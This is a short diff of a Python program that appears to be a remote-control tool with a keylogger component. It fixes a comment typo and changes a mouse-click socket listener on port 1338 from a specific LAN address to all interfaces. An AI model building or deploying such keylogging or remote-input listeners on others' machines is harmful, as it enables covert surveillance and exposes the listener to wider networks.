@@ -17,7 +17,7 @@ path = "C:\\screen.jpg"  #Can be changed to your hearts content
 MAX = 200000 #Maximum bytes received
 main = None 
 label = None
-alphabet = [] #Used for keylogger not a pretty a way but an efficient one
+alphabet = [] #Used for keylogger not a pretty way but an efficient one
 for i in range(65, 91):
     alphabet.append(i)
 for i in range(48,58):
@@ -66,7 +66,7 @@ def getCursorPositionLocal():
     
 def getMouseClick():
     mc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    mc.bind(("192.168.178.23", 1338))
+    mc.bind(("", 1338))
     mc.listen(2)
     c = mc.accept()[0]
     while True:
